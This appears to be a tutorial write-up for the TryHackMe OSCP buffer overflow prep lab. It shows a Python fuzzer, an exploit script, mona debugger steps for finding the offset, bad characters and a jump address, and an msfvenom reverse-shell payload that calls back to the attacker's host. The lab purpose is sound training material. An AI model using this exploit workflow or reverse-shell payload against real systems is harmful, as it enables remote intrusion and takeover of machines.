
# Buffer Overflow Preparation for OSCP

Link to the room : https://tryhackme.com/room/bufferoverflowprep

My OS : Kali GNU/Linux 2021.2

## Accessing the machine and overview

I am told to access the target machine using RDP with given credentials :
```
xfreerdp /u:admin /p:password /cert:ignore /v:<TARGET IP> /workarea
```
After successfully accessing the machine I can get to work but before that we must know how the whole vulnerability works. A buffer overflow condition exists when 
a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. In this case, a buffer is a 
sequential section of memory allocated to contain anything from a character string to an array of integers. Writing outside the bounds of a block of allocated memory 
can corrupt data, crash the program, or cause the execution of malicious code.

## OVERFLOWx Cheat Sheet
If we want to get a reverse shell using buffer overflow vulnerability we have to go through a few steps to get some information about this particular environment and use it 
with our exploit.py.

Here is content of fuzzer.py which will help us with getting information how long is our buffer :
```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.179.101"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```
And here is content of our exploit.py which we will edit in future to get some more information and maybe the reverse shell if we succeed :
```
import socket

ip = "10.10.179.101"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

We can divide the whole process of getting the reverse shell into :
1. Connecting to the port 1337 with netcat and choosing the right OVERFLOW (just because our task is to work with 10 various configurations)
2. Setting up mona configuration
3. Fuzzing
4. Generating a cyclic pattern of a length $(string that crashed the server) + 400
5. Running exploit.py with payload variable set to a cyclic pattern
6. Using mona to find offset number 
7. Finding bad characters and getting rid of them
8. Finding a jump point
9. Generating payload and editing our exploit.py
10. Getting the reverse shell

## OVERFLOW 1
We will start by running our Immunity Debugger and loading oscp.exe. We should Debug->run it because its loaded in paused state and then connect via netcat and port 1337 to 
choose the first OVERFLOW.
```
nc 10.10.179.101 1337
HELP
OVERFLOW1 test
```
Then let's setup our mona working folder in Immunity Debugger :
```
!mona config -set workingfolder c:\mona\%p
```
And with that out of our way we can start exploiting. First we need to get the sense of how long is our buffer. If we run `fuzzer.py 10.10.179.101` after a while we can notice 
that the server crashed with 2000 bytes long payload. Lets generate now a 2400B long cyclic pattern and copy it into "payload" variable of our exploit.py.
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```
Now we need to reopen our oscp.exe service and Debug->run it again. After running `python3 exploit.py` and crashing the server we can search for offset number in mona log 
window.
```
python3 exploit.py
!mona findmsp -distance 2400

output :
[...] 
EIP contains normal pattern : ... (offset 1978)
[...]
```
Update your exploit.py script with this value set as the offset variable. Now you can set the payload variable to an empty string again and the retn variable to "BBBB" so we can 
clearly see it in our logs (B is coded as 42 so we will see 42424242).

Next step is to find bad characters and we can do this by generating a bytearray using mona `!mona bytearray -b "\x00"` and excluding the null byte by default. Now we need to 
generate our own string of bad chars that is identical to the bytearray. The following script can be used :
```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
Set the payload value of our exploit.py to the string of bad chars the script generates. 

As always we need to restart our oscp.exe in Immunity and run the modified exploit.py script again. By default you should see on the right top corner window named "Registers (FPU)" 
This one will help us to locate address to which the ESP register points and use it in the following mona command :
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP REGISTER ADDRESS>
```
A popup window should appear. The windows shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated 
bytearray.bin file. Not all of these might be badchars so we need to manually go through some of them and see if we can get rid of them. Sometimes badchars cause the next byte 
to get corrupted as well.

If the popup window don't appear there might be a problem with locating bytearray.bin file. You can try and set the working folder again, restart the process and then try to 
compare.


Possibly bad chars that I received : `07 08 2e 2f a0 a1` and now I should manually remove them from left to right. We will start with `\x07\` byte. First off you need to 
remove it from your payload variable in exploit.py and then add it onto your new bytearray generated in mona using :
```
!mona bytearrray -b "\x00\x07"
```
And keep doing it till you got no bad chars. I had to specify `\x00\x07\x2e\xa0` and after running `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP REGISTER ADDRESS>` I had 
received information that `Hooray, normal shellcode unmodified!!!`. We can move into finding a jump point.


To find a jump point you need to run the command :
```
!mona jmp -r esp -cpb <ALL OF THE BAD CHARS>
```
in section <ALL OF THE BAD CHARS> you need to specify them including byte \x00. After running this command there will be a popup window called "Log data" with "Results:". In my 
case I had a total of 9 pointers. You can choose which ever you want but I will choose the first address `0x625011af` and put it into "retn" variable in exploit.py. For this 
example it should look like this :
```
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
```
As you can see the retn variable is written backwards. Thats because system is little endian, you dont need to really know more than this. Another thing is that padding is set 
to "\x90" * 16. We need to do this because you will need some space in memory for the payload to unpack itself. Only thing that is left is to generate our payload using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=445 EXITFUNC=thread -b <ALL BAD CHARS> -f c
```
and copying it into payload variable of our exploit.py. If everything is setup as I said you can restart your oscp.exe, run it and start listening with netcat on port 445. After 
executing exploit.py you should receive your reverse shell.
